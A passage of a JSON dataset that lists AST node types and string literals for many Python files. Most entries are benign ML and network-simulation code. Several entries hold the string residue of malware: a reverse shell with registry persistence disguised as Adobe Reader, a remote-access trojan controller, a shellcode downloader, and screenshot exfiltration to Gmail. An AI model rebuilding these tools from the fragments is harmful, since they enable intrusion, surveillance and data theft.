            "Computes the accuracy over the k top predictions\n        for the specified values of k.\n\n        Args:\n            _output (torch.Tensor): The batched logit tensor with shape ``(N, C)``.\n            _label (torch.Tensor): The batched label tensor with shape ``(N)``.\n            topk (~collections.abc.Iterable[int]): Which top-k accuracies to show.\n                Defaults to ``(1, 5)``.\n            **kwargs: Keyword arguments passed to :func:`trojanzoo.utils.model.accuracy`.\n\n        Returns:\n            dict[str, float]: Top-k accuracies.\n\n        Note:\n            The implementation is in :func:`trojanzoo.utils.model.accuracy`.\n        ",
            "compare",
            "trojanzoo.utils.fim",
            "resume",
            "get_all_layer",
            "model",
            "Moves all model parameters and buffers to the GPU.\n\n        See Also:\n            :any:`torch.nn.Module.cuda`.\n        ",
            "lr_scheduler",
            "suffix",
            "torchvision.models._api",
            "ndarray",
            "Get all intermediate layer outputs of\n        :attr:`_input` from any intermediate layer.\n\n        Args:\n            _input (torch.Tensor): The batched input tensor\n                from :attr:`layer_input`.\n            layer_input (str): The intermediate layer name of :attr:`_input`.\n                Defaults to ``'input'``.\n            depth (int): The traverse depth.\n                Defaults to ``-1`` (:math:`\\infty`).\n            prefix (str): The prefix string to all elements.\n                Defaults to empty string ``''``.\n            use_filter (bool): Whether to filter out certain layer types.\n\n                * :any:`torchvision.transforms.Normalize`\n                * :any:`torch.nn.Dropout`\n                * :any:`torch.nn.BatchNorm2d`\n                * :any:`torch.nn.ReLU`\n                * :any:`torch.nn.Sigmoid`\n            non_leaf (bool): Whether to include non-leaf nodes.\n                Defaults to ``False``.\n            seq_only (bool): Whether to only traverse children\n                of :any:`torch.nn.Sequential`.\n                If ``False``, will traverse children of all :any:`torch.nn.Module`.\n                Defaults to ``False``.\n            verbose (bool): The output level to show information\n                including layer name, output shape and module information.\n                Setting it larger than ``0`` will enable the output.\n                Different integer values stands for different module information.\n                Defaults to ``0``.\n\n                * ``0``: No output\n                * ``1``: Show layer class name.\n                * ``2``: Show layer string (first line).\n                * ``3``: Show layer string (full).\n\n        Returns:\n            dict[str, torch.Tensor]: The dict of all layer outputs.\n\n        See Also:\n            The implementation is in\n            :func:`trojanzoo.utils.model.get_all_layer()`.\n        ",
            "warmup_lr_scheduler",
            "``x -> self.preprocess -> self.features -> return``",
            "Set ``requires_grad=True`` for selected :attr:`params` of :attr:`module`.\n        All other params are frozen.\n\n        Args:\n            params (~collections.abc.Iterator[torch.nn.parameter.Parameter]):\n                The parameters to ``requires_grad``.\n                Defaults to ``[]``.\n        ",
            "define_features",
            "Tensor",
            "ModelType",
            "np",
            "pool",
            "dataset_name",
            "Flatten",
            "criterion_noreduction",
            "torch",
            "\n    | A general model wrapper class, which should be the most common interface for users.\n    | It inherits :class:`trojanzoo.utils.module.BasicObject`.\n\n    Args:\n        name (str): Name of model.\n        suffix (str):\n            | Suffix of local model weights file (e.g., ``'_adv_train'``).\n              Defaults to empty string ``''``.\n            | The location of local pretrained weights is\n              ``'{folder_path}/{self.name}{self.suffix}.pth'``\n        model (type[_Model] | _Model): Type of model or a specific model instance.\n        dataset (trojanzoo.datasets.Dataset | None): Corresponding dataset (optional).\n            Defaults to ``None``.\n        num_classes (int | None): Number of classes.\n            If it's ``None``, fetch the value from :attr:`dataset`.\n            Defaults to ``None``.\n        folder_path (str): Folder path to save model weights.\n            Defaults to ``None``.\n\n            Note:\n                :attr:`folder_path` is usually\n                ``'{model_dir}/{dataset.data_type}/{dataset.name}'``,\n                which is claimed as the default value of :func:`create()`.\n        official (bool): Whether to use official pretrained weights.\n            Defaults to ``False``.\n        pretrained (bool): Whether to use local pretrained weights\n            from ``'{folder_path}/{self.name}{self.suffix}.pth'``\n            Defaults to ``False``.\n        randomized_smooth (bool): Whether to use randomized smoothing.\n            Defaults to ``False``.\n        rs_sigma (float): Randomized smoothing sampling std :math:`\\sigma`.\n            Defaults to ``0.01``.\n        rs_n (int): Randomized smoothing sampling number. Defaults to ``100``.\n\n    Attributes:\n        available_models (set[str]): The list of available model names.\n        weights (~torchvision.models._api.WeightsEnum): The pretrained weights to use.\n\n        name (str): Name of model.\n        suffix (str):\n            | Suffix of local model weights file (e.g., ``'_adv_train'``).\n              Defaults to empty string ``''``.\n            | The location of local pretrained weights is\n              ``'{folder_path}/{self.name}{self.suffix}.pth'``\n        _model (_Model): :any:`torch.nn.Module` model instance.\n        model (torch.nn.DataParallel | _Model):\n            Parallel version of :attr:`_model` if there is more than 1 GPU available.\n            Generated by :meth:`get_parallel_model()`.\n        dataset (trojanzoo.datasets.Dataset | None): Corresponding dataset (optional).\n            Defaults to ``None``.\n        num_classes (int | None): Number of classes.\n            If it's ``None``, fetch the value from :attr:`dataset`.\n            Defaults to ``None``.\n        folder_path (str): Folder path to save model weights.\n            Defaults to ``None``.\n        randomized_smooth (bool): Whether to use randomized smoothing.\n            Defaults to ``False``.\n        rs_sigma (float): Randomized smoothing sampling std :math:`\\sigma`.\n        rs_n (int): Randomized smoothing sampling number. Defaults to ``100``.\n\n        criterion (~collections.abc.Callable):\n            The criterion used to calculate :meth:`loss()`.\n        criterion_noreduction (~collections.abc.Callable):\n            The criterion used to calculate :meth:`loss()`\n            when ``reduction='none'``.\n        softmax (torch.nn.Module): :any:`torch.nn.Softmax` ``(dim=1)``.\n            Used in :meth:`get_prob()`.\n    ",
            "std",
            "Applies ``fn`` recursively to every submodule (as returned by ``.children()``)\n        as well as self. Typical use includes initializing the parameters of a model\n\n        See Also:\n            :any:`torch.nn.Module.apply`.\n        ",
            "train",
            "args",
            "Process data. Defaults to be :attr:`self.dataset.get_data`.\n        If :attr:`self.dataset` is ``None``, return :attr:`data` directly.\n\n        Args:\n            data (Any): Unprocessed data.\n            **kwargs: Keyword arguments passed to\n                :attr:`self.dataset.get_data()`.\n\n        Returns:\n            Any: Processed data.\n        ",
            "index",
            "collections.abc",
            "main_tag",
            "Invalid lr_warmup_method=",
            "factor",
            "output_available_models",
            "topk",
            "depth",
            "component",
            "stack",
            "activation",
            "print_prefix",
            "loss_fn",
            "extend",
            "p",
            "lr_min",
            "Optimizer",
            "requires_grad",
            "modules",
            "help",
            "torch.optim.optimizer",
            "-",
            "reversed",
            "Dropout",
            "after_loss_fn",
            "get_logits",
            "_train",
            "default",
            "from_numpy",
            "key",
            "argmax",
            "get_final_fm",
            "Save pretrained model weights.\n\n        Args:\n            file_path (str | None): The file path to save pretrained weights.\n                Defaults to ``'{folder_path}/{self.name}{suffix}.pth'``.\n            folder_path (str | None): The folder path containing model checkpoint.\n                It is used when :attr:`file_path` is not provided.\n                Defaults to :attr:`self.folder_path`.\n            suffix (str | None): The suffix string to model weights file.\n                Defaults to :attr:`self.suffix`.\n            component (str): Specify which part of the weights to save.\n                Choose from ``['full', 'features', 'classifier']``.\n                Defaults to ``'full'``.\n            verbose (bool): Whether to output auxiliary information.\n                Defaults to ``False``.\n            indent (int): The indent of output auxialiary information.\n            **kwargs: Keyword arguments passed to :any:`torch.save`.\n        ",
            "valid",
            "Get official model weights from :attr:`weights`.\n\n        Args:\n            weights (~torchvision.models._api.WeightsEnum | None):\n                The pretrained weights to use.\n                Defaults to :attr:`self.weights[self.name]`.\n            map_location (str | ~torch.torch.device | dict):\n                Passed to :any:`torch.hub.load_state_dict_from_url`.\n                Defaults to ``'cpu'``.\n            **kwargs: Keyword arguments passed to\n                :any:`torch.hub.load_state_dict_from_url`.\n\n        Returns:\n            OrderedDict[str, torch.Tensor]: The model weights OrderedDict.\n        ",
            "Validate",
            "--rs_sigma",
            "map_location",
            "seq",
            "eta_min",
            "mean",
            "dtype",
            "int",
            "Train the model",
            "__all__",
            "kwargs",
            "items",
            "model name suffix (e.g., \"_adv_train\")",
            "description",
            "KeyError",
            "parameters",
            "to"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Subscript",
            "For",
            "Store",
            "Name",
            "ClassDef",
            "Constant",
            "Tuple",
            "Import",
            "Compare",
            "List",
            "NotIn",
            "Expr",
            "USub",
            "UnaryOp",
            "Assign",
            "alias",
            "arguments",
            "Attribute",
            "Dict",
            "If",
            "ImportFrom",
            "arg"
        ],
        "Strings": [
            "append",
            "\n        Description: Node class represents a computer in the network. nodeID is used to identify\n                     the node, adjacentNodes is a list that stores a nodes directly connected neighbors.\n                     susceptibility var tells us if a node becomes susceptible to getting infectede\n                     from a virus.\n    ",
            "nodeID",
            "TREE",
            "numpy",
            "HYBRID",
            "NONE",
            "clean",
            "\n        Description: Network class holds all nodes in the network. nodes is a dictionary\n                     which stores a Node object for each corresponding node number. infectedList\n                     is a list, the index of which represents that particular node and the value\n                     it holds (defined enums per the state class) tells us the current status\n                     of the node corresponding to that index. networkType holds a value that\n                     represents the type of network that is being created.\n                     createnetwork() method takes as input a string filename and passed it onto\n                     drawGraphFromFile() class which returns a list of pairs of numbers. Each pair\n                     of numbers represents a connection between those two nodes. The function uses each\n                     pair to construct a Node object and a dictionary item and insert them into the\n                     corresponding data structure.\n    ",
            "susceptibility",
            "BUS",
            "status",
            "\n            Description: creates a network from a list of pair of numbers. For each pair in the\n                         list returned by drawGraphFromFile, if the 1st number in the pair is not already in\n                         nodes dictionary, a new Node is created for that number and the adjacentNodes\n                         list in the Node objects gets appended the second number in the pair as a neighbor.\n                         The infected list also gets appended a state.clean value to mark that a node\n                         with initial status is added. Later, the index will represent the node corresponding\n                         to that number. If the there's already a node for that 1st number, only the\n                         adjacentNodes list will get updated. Same steps will be followed for the second\n                         number in the pair.\n            Pre-Condition: filename as a string\n            Post-Condition: nodes contains the node numbers as keys and Nodes as values, infectedList\n                            contains a list of state.none values from index 1 to the highest index read\n                            from the file. Index 0 will not be used since it is not in the network.\n        ",
            "graphArray",
            "filename",
            "N",
            "GraphType",
            "__init__",
            "susceptible",
            "nodeNum",
            "\n        Description: graphType is an Enum type. NONE is for a node that does not represent the network.\n                     For example zeroth node and/or index is not considered a node in the network. All\n                     other network types are given numbers from 1 to 8 that represents a particular type\n                     of network.\n     ",
            "MESH",
            "adjacentNodes",
            "\n        Description: state is an Enum type. none is for a non-node such as for the zeroth index/node\n                     which is not used in the network. clean refers to a node that has not yet seen\n                     any effect from a virus. All nodes at the initialization step are set to clean.\n                     infected means a node is infected by a virus. susceptible means there is a higher\n                     chance of getting infected by a virus but that has not happened yet. immune is when\n                     a node has recovered from an infection and is now immune to all viruses.\n     ",
            "int",
            "none",
            "self",
            "displayVirusSpread",
            "type",
            "uniform",
            "Node",
            "Enum",
            "disp",
            "createnetwork",
            "STAR",
            "pair",
            "nodeStrengthRange",
            "random",
            "drawGraphFromFile",
            "nodes",
            "immune",
            "Network",
            "infected",
            "LINE",
            "rhs",
            "infectedList",
            "ALL_CONNECTED",
            "State",
            "lhs",
            "enum",
            "RING",
            "networkType"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Subscript",
            "For",
            "Store",
            "Name",
            "FormattedValue",
            "ClassDef",
            "Constant",
            "In",
            "Import",
            "Compare",
            "Expr",
            "JoinedStr",
            "keyword",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "arg",
            "With"
        ],
        "Strings": [
            "log",
            "file",
            "a",
            "logs/",
            "log_file",
            "PortScanner",
            "ipv4",
            "scan",
            "MAC Address: ",
            "all_hosts",
            "addresses",
            "IP Address: ",
            "\n",
            "nmap",
            "nm",
            "ip_address",
            "-sn",
            "self",
            "write",
            "mac_address",
            "host",
            "Nmap draaien van het lokaal netwerk ",
            "arguments",
            "Nmap_module",
            "mac",
            "Unknown",
            "hosts",
            "open",
            "/log_nmap.txt",
            "id",
            "192.168.0.0/24"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Pass",
            "Subscript",
            "Store",
            "Name",
            "ExceptHandler",
            "Constant",
            "While",
            "Tuple",
            "Break",
            "Import",
            "Compare",
            "List",
            "NotIn",
            "Mod",
            "Try",
            "Expr",
            "keyword",
            "AugAssign",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "Attribute",
            "If",
            "BinOp",
            "arg",
            "Eq"
        ],
        "Strings": [
            "append",
            "OpenKey",
            "runkey",
            "read",
            "stdout",
            "socket",
            "HKEY_LOCAL_MACHINE",
            "proc",
            "stdin",
            "data",
            "__main__",
            "SOCK_STREAM",
            "fileName",
            "stdout_value",
            "Adobe_ReaderX",
            "KEY_ALL_ACCESS",
            "sys",
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "system",
            "%TEMP%",
            "%TEMP%\\mw.exe",
            "os",
            "send",
            "tempdir",
            "Adobe ReaderX",
            "subkey",
            "subprocess",
            "recv",
            "s",
            "copy %s %s",
            "base64",
            "quit",
            "PIPE",
            "AF_INET",
            "int",
            "SetValueEx",
            "run",
            "close",
            "192.168.56.1",
            "shell",
            "i",
            "autorun",
            "stderr",
            "Popen",
            "connect",
            "Close",
            "b64encode",
            "WindowsError",
            "argv",
            "[*] Connection Established!",
            "__name__",
            "encoded",
            "main",
            "EnumValue",
            "winreg",
            "REG_SZ",
            "key"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Gt",
            "For",
            "Store",
            "Name",
            "FormattedValue",
            "GtE",
            "ClassDef",
            "Constant",
            "While",
            "Tuple",
            "Import",
            "Compare",
            "IsNot",
            "Lt",
            "List",
            "Not",
            "BitAnd",
            "Expr",
            "JoinedStr",
            "Return",
            "Is",
            "UnaryOp",
            "AugAssign",
            "Assign",
            "Add",
            "And",
            "alias",
            "LtE",
            "arguments",
            "Attribute",
            "Sub",
            "If",
            "BinOp",
            "BoolOp",
            "ImportFrom",
            "Mult",
            "arg",
            "Eq"
        ],
        "Strings": [
            "Detector",
            "d",
            "user32",
            "last_input",
            "ctypes",
            "keystrokes",
            "sizeof",
            "double_clicks",
            "LAST_INPUT_INFO",
            "exit",
            "c_unit",
            " Checks for keypresses or mouse clicks.",
            "dwTime",
            "__main__",
            "cbSize",
            "max_mouse_clicks",
            "detect",
            "sys",
            "elapsed",
            "[*] It's been ",
            "mouse_clicks",
            "run_time",
            "__init__",
            "max_keystrokes",
            "GetLastInputInfo",
            "GetAsyncKeyState",
            "struct_lastinputinfo",
            "previous_timestamp",
            "kernel32",
            "get_key_press",
            "time",
            "okay.",
            "byref",
            "c_uint",
            "first_double_click",
            "double_click_threshold",
            "self",
            "fields_",
            "keypress_time",
            "run",
            "print",
            "max_double_clicks",
            "random",
            "c_ulong",
            "Structure",
            " Determine user inactivity based on machine and user intel.",
            "i",
            "win32api",
            " milliseconds since the last event.",
            "get_last_input",
            "state",
            "windll",
            "randint",
            "__name__",
            "GetTickCount",
            "detection_complete",
            "range",
            "max_input_threshold"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Store",
            "Name",
            "FormattedValue",
            "With",
            "Constant",
            "Tuple",
            "Import",
            "Compare",
            "Expr",
            "JoinedStr",
            "Return",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "arg",
            "Eq"
        ],
        "Strings": [
            "SM_CYVIRTUALSCREEN",
            "read",
            ".bmp",
            "win32ui",
            "mem_dc",
            "DeleteObject",
            "top",
            "name",
            "width",
            "CreateCompatibleDC",
            "SelectObject",
            "__main__",
            "BitBlt",
            "CreateCompatibleBitmap",
            "desktop_dc",
            "SM_CXVIRTUALSCREEN",
            "screenshot",
            "GetHandle",
            "img",
            "f",
            "get_dimensions",
            "base64",
            "left",
            "CreateBitmap",
            "height",
            "run",
            "win32con",
            "SRCCOPY",
            "win32gui",
            "SM_XVIRTUALSCREEN",
            "win32api",
            "SM_YVIRTUALSCREEN",
            "img_dc",
            "CreateDCFromHandle",
            "GetWindowDC",
            "GetSystemMetrics",
            "DeleteDC",
            "__name__",
            "open",
            "hdesktop",
            "SaveBitmapFile",
            "GetDesktopWindow",
            "screenshot.bmp"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Gt",
            "Subscript",
            "Store",
            "Name",
            "FormattedValue",
            "ExceptHandler",
            "Constant",
            "While",
            "Or",
            "Lambda",
            "Tuple",
            "Break",
            "Import",
            "Compare",
            "Lt",
            "Not",
            "Global",
            "Try",
            "Expr",
            "JoinedStr",
            "Return",
            "IfExp",
            "keyword",
            "UnaryOp",
            "AugAssign",
            "Eq",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "BoolOp",
            "BinOp",
            "Mult",
            "arg",
            "With"
        ],
        "Strings": [
            "",
            "Unrecognized Command: (",
            "success",
            "\n[Remote Machine Output]\n",
            "HOST",
            "socket",
            "e2",
            "FilePath",
            "file",
            "w",
            "Delete",
            "start ",
            "Camera Name: (",
            "name",
            "-lc",
            "delay",
            "SOCK_STREAM",
            "[ ",
            "[-sf] Send File                        |",
            "Invalid Choice, Returning...\n",
            "SOL_SOCKET",
            "files",
            "-tc",
            "[-rc] Restart Computer                 |",
            "Computer Connected: (",
            "[-sm] Send Message (VBS-Box)           |",
            "\n[-] Lost Connection to (",
            "accept",
            "Error Message: ",
            "\nType Message: ",
            "f",
            "input",
            "[-ow] Open Webpage                     |",
            "Status: (Process Running)\n",
            "[-ss] Capture Screenshot               |",
            "\n[Press Enter to Delete]",
            "Webcam_Name",
            "(User Interface Commands)              |\n",
            "quit",
            "rb",
            "conn",
            "\nWebpage URL: ",
            "write",
            "_______________________________________|",
            "FileLocation",
            "-sm",
            ")",
            "ImageFile",
            "PythonInterpreter",
            "webcam",
            "end",
            "choice",
            "address",
            "(Appended Connection)\n",
            "%H:%M:%S",
            "Number_Of_Files",
            "SystemInformation",
            "(File Not Found)\n",
            "lower",
            "ViewFiles",
            "\n[+] Webcam Captured\n",
            "Status: (",
            "main",
            "Remote Directory: ",
            "-vf",
            "wb",
            "(Connection Commands)                  |\n",
            "\n(Keyboard Interrupted, Connection Appended)\n",
            "KeyboardInterrupt",
            "-rc",
            "]\n\n",
            "d",
            "read",
            "[-dl] Delete File/Directory            |",
            "System: (",
            "RemoteCMD",
            "strip",
            "[-sc] Shutdown Computer                |",
            "OpenWebpage",
            "e",
            "SO_REUSEADDR",
            "\n<No Output>\n",
            "encode",
            "filename",
            "                                       |",
            "\n",
            "_______________________________________",
            "http://",
            "Available Drives: (",
            "-ac",
            "time",
            "AF_INET",
            "(Remote File Deleted)\n",
            "Returning...\n",
            "UserOption",
            "len",
            "print",
            "VALID",
            ".png",
            "strftime",
            "[-rs] Remote CMD Shell                 |",
            "ClientInfo",
            "(Remote File Not Found)\n",
            "<",
            "listen",
            "[-cw] Capture Webcam                   |",
            "https://",
            "[3] Error: (",
            "e3",
            "(File Commands)                        |\n",
            "[1] Error: (",
            "Currently in CMD\n\n",
            "recvall",
            "split",
            "[-vf] View Files                       |",
            "SUCCESS",
            "[-ac] Append Connection to Background  |",
            "-rf",
            "PORT",
            "[-cd] Get Current Directory            |",
            "-sp",
            "exit",
            "directory",
            "CodeFile",
            "cls",
            "IP Address: (",
            "str",
            "]\nTotal Size: [",
            "(System Commands)                      |\n",
            "\n[+] File Received\nFile Name: [",
            " Bytes]\n",
            "Screenshot",
            "startswith",
            ")> ",
            "bind",
            "os",
            "screenshot",
            "-si",
            "send",
            "[-tc] Terminate Connection             |",
            "(Cannot Find Remote File)\n",
            "url",
            "recv",
            "-dl",
            "buffer",
            "\n[+] Screenshot Captured\n",
            "help",
            " ",
            "CMD_Command",
            "_______________________________________|\n",
            "ClientResponse",
            "SOMAXCONN",
            "-",
            "RemotePath",
            "Public IP: (",
            "(Bad URL, use: http/https)\n",
            "error",
            "Webcam",
            "(Remote Directory Not Found)\n",
            "(Exited CMD)\n",
            "]\nCharacter Count: [",
            "?",
            "Remote File Path: ",
            "setsockopt",
            "\nComputer: (",
            "path",
            "getsize",
            "y",
            "(Remote CMD Active)\n\n",
            "StartProcess",
            "message",
            "-rs",
            "-cd",
            "[-pi] Remote Python Interpreter        |",
            ")\n",
            "Username: (",
            "basename",
            ") (",
            "data",
            "remove",
            "RemoteCommands",
            "-sc",
            "bufsize",
            "sleep",
            "SplitOutput",
            "posix",
            "system",
            "CurrentRemoteDirectory",
            "-cw",
            "-ow",
            "UsableCommands",
            "buffersize",
            "clear",
            "\nRemote File Location: ",
            ":",
            "0.0.0.0",
            "[-sp] Start Process on Remote Machine  |",
            "-pi",
            "(Terminated Connection)\n",
            "[-rf] Receive File                     |",
            "SendFile",
            "\nEnter File Path: ",
            "[-si] View System Information          |",
            "objSocket",
            " ]> ",
            "current_time",
            "code.txt",
            "\nRemote File Path: ",
            "int",
            "Exception",
            "[2] Error: (",
            "(",
            "ClientOutput",
            "SendCodeFile",
            "close",
            "ReceiveFile",
            "(Error Capturing Screen)\n",
            "RemoteDirectory",
            "\nDelete File/Directory? (f/d): ",
            "(No Webcam Detected)\n",
            "xdg-open ",
            "-ss",
            "localtime",
            "(Remote Directory Deleted)\n",
            "cmd",
            "\nFiles: [",
            "Total Size: (",
            " Bytes)\n",
            "Listening on Port: (",
            "-sf",
            "open",
            "decode",
            "\nExecute Code on Remote Machine? (y/n): ",
            "join",
            "isfile",
            "[-lc] Lock Computer                    |",
            "command"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "Call",
            "Load",
            "Subscript",
            "Store",
            "FormattedValue",
            "Name",
            "Constant",
            "While",
            "Tuple",
            "Import",
            "Compare",
            "Not",
            "Expr",
            "JoinedStr",
            "UnaryOp",
            "Assign",
            "And",
            "alias",
            "Attribute",
            "If",
            "BoolOp",
            "Eq"
        ],
        "Strings": [
            "utf-8",
            "PORT",
            "chat off",
            "Send in client terminal: ",
            "HOST",
            "socket",
            "client",
            "command_input",
            "SOCK_STREAM",
            "executed_command",
            " was executed successfully.",
            "mode",
            "encode",
            "bind",
            "accept",
            "send",
            "input",
            "recv",
            "split",
            "AF_INET",
            "client_mode",
            "print",
            "len",
            "chat",
            "Server is waiting connection with client",
            "Enter a command: ",
            "package",
            "#",
            "listen",
            "server",
            "address",
            "[info] ",
            "message sent to client terminal",
            "192.168.43.78",
            "mode: ",
            "decode",
            "default",
            "the command ",
            "Connected to ",
            "message"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Store",
            "Name",
            "Constant",
            "Tuple",
            "Import",
            "Compare",
            "Expr",
            "Return",
            "Eq",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "ImportFrom",
            "arg",
            "With"
        ],
        "Strings": [
            "read",
            "request",
            "c_size_t",
            "CFUNCTYPE",
            "ctypes",
            "VirtualAlloc",
            "ptr",
            "write_memory",
            "__main__",
            "shellcode",
            "Writes the buffer into memory",
            "argtypes",
            "decodebytes",
            "RtlMoveMemory",
            "buf",
            "response",
            "urlopen",
            " To base64 encode your code, use the following command: \n        $ base64 -w 0 -i myshellcode.raw > myshellcode.bin ",
            "urllib",
            "url",
            "kernel32",
            "buffer",
            "sellcode",
            "create_string_buffer",
            "http://<your-ip>:<your-port>/shellcode.bin",
            "restype",
            "base64",
            "shell_func",
            "len",
            "run",
            "get_code",
            "c_void_p",
            "length",
            "windll",
            "__name__",
            "cast"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Gt",
            "Div",
            "NotEq",
            "Subscript",
            "For",
            "Store",
            "Name",
            "Constant",
            "While",
            "Tuple",
            "Import",
            "Compare",
            "List",
            "Slice",
            "Expr",
            "Return",
            "AugAssign",
            "Assign",
            "Add",
            "And",
            "alias",
            "arguments",
            "Attribute",
            "Sub",
            "If",
            "BinOp",
            "Mult",
            "BoolOp",
            "arg",
            "Eq"
        ],
        "Strings": [
            "append",
            "where",
            "typeOfGraph",
            "x",
            "runOnce",
            "numpy",
            "n",
            "network",
            "nowhereToGo",
            "array",
            "hasNewAnimationInfo",
            "display",
            "percentage",
            "currentTurnMoves",
            "infectedCount",
            "N",
            "rate",
            "animationSteps",
            "displayAnimation",
            "adjacentNodes",
            "simulationNotOver",
            "infectionRates",
            "count",
            "infected_nodes_count",
            "checkRate",
            "percent_infected",
            "infected_nodes",
            "displayVirusSpread",
            "len",
            "newList",
            "neighbor",
            "disp",
            "displayData",
            "lastInfectedCount",
            "node",
            "nodes",
            "move",
            "immune",
            "Network",
            "infected",
            "startingPoint",
            "infectedList",
            "State",
            "dataToDisplay",
            "range",
            "virus",
            "infectOrNot",
            "networkType"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "ExceptHandler",
            "Module",
            "Constant",
            "alias",
            "Call",
            "Load",
            "Try",
            "Expr",
            "Attribute",
            "Import",
            "ImportFrom",
            "Store",
            "Name"
        ],
        "Strings": [
            "grabscreen",
            "read",
            "screen.jpg",
            "file",
            "login_mail",
            "data",
            "remove",
            "email.mime.text",
            "sys",
            "smtp.gmail.com",
            "system",
            "login_pass",
            "os",
            "789sk.email@gmail.com",
            "save",
            "f",
            "input",
            "please enter your mail-id",
            "pip install pillow ; pip install email",
            "s",
            "time",
            "base64",
            "smtplib",
            "quit",
            "rb",
            "SMTP",
            "grab",
            "sendmail",
            "close",
            "email.mime.multipart",
            "ImageGrab",
            "789sk.gupta@gmail.com",
            "b64encode",
            "enter your mail password",
            "MIMEMultipart",
            "MIMEtext",
            "starttls",
            "open",
            "PIL",
            "login",
            "message"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Store",
            "Name",
            "FormattedValue",
            "Constant",
            "While",
            "Tuple",
            "Import",
            "Compare",
            "Expr",
            "JoinedStr",
            "AugAssign",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "Attribute",
            "If",
            "arg",
            "Eq"
        ],
        "Strings": [
            "utf-8",
            "PORT",
            "chat off",
            "HOST",
            "socket",
            "client",
            "Chat mode is already on.",
            "trojan",
            "SOCK_STREAM",
            "server_command",
            "mode",
            "encode",
            "command",
            "Chat mode off.",
            "\n\n\nYOU GOT INFECTED IHIHIHIH!",
            "send",
            "Chat mode on.",
            "recv",
            "send_to_server",
            "AF_INET",
            "infect",
            "print",
            "chat on",
            "chat",
            "package",
            "#",
            "connect",
            "192.168.43.78",
            "decode",
            "default",
            "hackers says: ",
            "message"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Store",
            "FormattedValue",
            "Name",
            "ClassDef",
            "Constant",
            "Import",
            "List",
            "Expr",
            "JoinedStr",
            "keyword",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "arg",
            "With"
        ],
        "Strings": [
            "stdout",
            "log",
            "socket",
            "username",
            "file",
            "id",
            "hostname",
            "strip",
            "a",
            "gethostname",
            "-p",
            "logs/",
            "log_file",
            "release",
            "Opslag:\n",
            "Hostnaam: ",
            "system",
            "capture_output",
            "operating_system",
            "Besturingssysteem: ",
            "\n",
            "Gebruikersnaam: ",
            "Gebruiksduur: ",
            "subprocess",
            "Kernelversie: ",
            "kernel_version",
            "uptime",
            "text",
            "time",
            "-h",
            "df",
            "self",
            "write",
            "whoami",
            "run",
            "disk_usage",
            "platform",
            "systeeminformatie krijgen van de computer ",
            "Sysinfo_module",
            "open",
            "/log_sysinfo.txt"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "Module",
            "alias",
            "Constant",
            "Call",
            "Load",
            "Attribute",
            "Expr",
            "Tuple",
            "Import",
            "Store",
            "List",
            "Name"
        ],
        "Strings": [
            "append",
            "typeOfGraph",
            "graphType",
            "LINE",
            "display",
            "displayVirusSpread",
            "animationSteps",
            "dataToDisplay",
            "disp",
            "displayData"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "ExceptHandler",
            "Module",
            "alias",
            "Constant",
            "Call",
            "Load",
            "Dict",
            "Expr",
            "Attribute",
            "Try",
            "Import",
            "Subscript",
            "For",
            "Store",
            "Name"
        ],
        "Strings": [
            "",
            "for shape",
            "ring",
            "x",
            "passed",
            "tree",
            "e",
            "star",
            "maker",
            "mesh",
            "Test #",
            "Exception",
            "fileMaker",
            "Entering",
            "Error in test number",
            "line",
            "type",
            "print",
            "fullConnected",
            "shape",
            "tests",
            "range",
            "shapes"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "Module",
            "Constant",
            "alias",
            "Call",
            "Load",
            "Continue",
            "Attribute",
            "Expr",
            "Break",
            "If",
            "Import",
            "Compare",
            "ImportFrom",
            "For",
            "Store",
            "Name",
            "Eq"
        ],
        "Strings": [
            "\ntestNetwork.py\n\nDescription: This file is meant to test if the Network class is correctly \n            creating the networks from the text files. It does this by \n            creating the files with a certain number of nodes and comparing it \n            to the number of nodes in the network.\n\nNotes: Because a network cannot have less than 2 nodes, each network starts at\n        2 nodes and increments by 1 until 100.\n",
            "Failed",
            "x",
            "ring",
            "network",
            "line.txt",
            "str",
            "fileName",
            "tree",
            "sleep",
            "tree.txt",
            "Passed",
            "star",
            "maker",
            "mesh",
            "Tests Failed, Invalid shape",
            "net",
            "star.txt",
            "time",
            "fileMaker",
            "fullconnect.txt",
            "ring.txt",
            "line",
            "len",
            "print",
            "createnetwork",
            "fullConnected",
            "nodes",
            "networkShape",
            "Network",
            "Test",
            "Network Tests Completed",
            "range",
            "mesh.txt"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "Module",
            "Constant",
            "alias",
            "Call",
            "Load",
            "Attribute",
            "Expr",
            "Tuple",
            "Import",
